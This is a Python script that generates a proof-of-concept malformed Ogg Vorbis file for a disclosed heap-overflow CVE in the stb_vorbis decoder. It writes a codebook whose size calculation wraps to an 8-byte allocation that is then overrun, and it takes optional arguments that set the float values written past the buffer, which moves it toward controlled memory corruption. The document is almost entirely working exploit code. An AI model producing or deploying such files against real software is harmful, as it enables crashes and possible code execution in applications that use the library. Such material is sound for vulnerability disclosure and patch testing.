#!/usr/bin/env python3
"""Generate the CVE-2026-89266 Ogg Vorbis PoC (public issue nothings/stb#1947).

Usage: gen_poc.py OUTPUT [ENTRIES] [DIMS]
Default entries=16519105, dims=65 makes sizeof(float)*entries*dims
= 4294967300 = 2^32+4, truncated to int 4 then rounded to malloc(8);
the pre-expansion loop writes 31 floats into that 8-byte region.
"""
import struct
import sys

ENTRIES = int(sys.argv[2]) if len(sys.argv) > 2 else 16519105
DIMS = int(sys.argv[3]) if len(sys.argv) > 3 else 65
TARGET_IEEE = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0  # desired float bits in memory
SEQP = int(sys.argv[5]) if len(sys.argv) > 5 else 0  # sequence_p: feed `last` into successive floats
# stb_vorbis reads this field through float32_unpack(), not raw IEEE bits.
def ieee_to_vorbis(bits):
    if bits == 0:
        return 0
    sign = (bits >> 31) << 31
    mant = bits & 0x7fffff
    exp = (bits >> 23) & 0xff
    if exp == 0:
        if mant == 0:
            return sign | (639 << 21)  # negative zero
        shift = (mant & -mant).bit_length() - 1
        sig = mant >> shift
        assert sig <= 0x1fffff, "subnormal not exactly representable"
        return sign | ((639 - shift) << 21) | sig
    assert 1 <= exp <= 254 and (mant & 7) == 0, "marker not exactly representable"
    return sign | ((exp + 641) << 21) | (0x100000 | (mant >> 3))

VORBIS_MIN = ieee_to_vorbis(TARGET_IEEE)

class BitWriter:
    def __init__(self):
        self.data = bytearray()
        self.cur = 0
        self.pos = 0
    def write(self, value, n):
        for i in range(n):
            if value & (1 << i):
                self.cur |= 1 << self.pos
            self.pos += 1
            if self.pos == 8:
                self.data.append(self.cur)
                self.cur = 0
                self.pos = 0
    def finish(self):
        if self.pos > 0:
            self.data.append(self.cur)
        return bytes(self.data)

def _ogg_crc_table():
    table = []
    for i in range(256):
        s = i << 24
        for _ in range(8):
            s = ((s << 1) ^ 0x04C11DB7) if s & 0x80000000 else (s << 1)
            s &= 0xFFFFFFFF
        table.append(s)
    return table
_CRC = _ogg_crc_table()

def ogg_crc(data):
    crc = 0
    for b in data:
        crc = ((crc << 8) ^ _CRC[(b ^ (crc >> 24)) & 0xFF]) & 0xFFFFFFFF
    return crc

def make_ogg_page(ht, serial, seq, gran, pkt):
    st = bytearray()
    rem = len(pkt)
    while rem >= 255:
        st.append(255)
        rem -= 255
    st.append(rem)
    hdr = bytearray(b"OggS") + bytes([0, ht])
    hdr += struct.pack("<Q", gran & 0xFFFFFFFFFFFFFFFF)
    hdr += struct.pack("<III", serial, seq, 0)
    hdr.append(len(st))
    hdr += st
    page = bytearray(hdr + pkt)
    struct.pack_into("<I", page, 22, ogg_crc(page))
    return bytes(page)

bw = BitWriter()
bw.write(5, 8)
for c in b"vorbis":
    bw.write(c, 8)
bw.write(1, 8)  # 2 codebooks

# Codebook 0: minimal (1 dim, 2 entries, one bit per codeword, no VQ)
bw.write(0x42, 8); bw.write(0x43, 8); bw.write(0x56, 8)
bw.write(1, 8); bw.write(0, 8); bw.write(2, 8); bw.write(0, 8); bw.write(0, 8)
bw.write(0, 1); bw.write(0, 1); bw.write(0, 5); bw.write(0, 5); bw.write(0, 4)

# Codebook 1: entries*dims chosen so sizeof(float)*product wraps 2^32+4
bw.write(0x42, 8); bw.write(0x43, 8); bw.write(0x56, 8)
bw.write(DIMS & 0xFF, 8); bw.write((DIMS >> 8) & 0xFF, 8)
bw.write(ENTRIES & 0xFF, 8); bw.write((ENTRIES >> 8) & 0xFF, 8)
bw.write((ENTRIES >> 16) & 0xFF, 8)
bw.write(1, 1)   # ordered
bw.write(22, 5)  # initial codeword length 23
bw.write(258111, 24)
bw.write(16260994, 24)
bw.write(1, 4)   # lookup_type=1
bw.write(VORBIS_MIN & 0xffffffff, 32); bw.write(0, 32); bw.write(0, 4); bw.write(SEQP, 1)
bw.write(0, 1); bw.write(0, 1)  # two multiplicands

# Minimal floor / residue / mapping / mode
bw.write(0, 6); bw.write(1, 16); bw.write(0, 5); bw.write(0, 4); bw.write(0, 4)
bw.write(0, 6); bw.write(0, 16); bw.write(0, 24); bw.write(31, 24)
bw.write(0, 24); bw.write(0, 6); bw.write(0, 8); bw.write(0, 3); bw.write(0, 1)
bw.write(0, 6); bw.write(0, 16); bw.write(0, 1); bw.write(0, 1); bw.write(0, 8); bw.write(0, 8)
bw.write(0, 6); bw.write(0, 1); bw.write(0, 16); bw.write(0, 16); bw.write(0, 8)
bw.write(1, 1)

setup = bw.finish()
ident = bytes([1]) + b"vorbis" + struct.pack("<IBIiii", 0, 1, 16000, 0, 0, 0) + bytes([6 | (6 << 4), 1])
comment = bytes([3]) + b"vorbis" + struct.pack("<I", 3) + b"stb" + struct.pack("<I", 0) + bytes([1])
serial = 0xDEAD0065
ogg = (make_ogg_page(0x02, serial, 0, 0, ident)
       + make_ogg_page(0x00, serial, 1, 0, comment)
       + make_ogg_page(0x00, serial, 2, 0, setup))
with open(sys.argv[1], "wb") as fh:
    fh.write(ogg)
print(f"wrote {sys.argv[1]}: {len(ogg)} bytes, entries={ENTRIES}, dims={DIMS}")
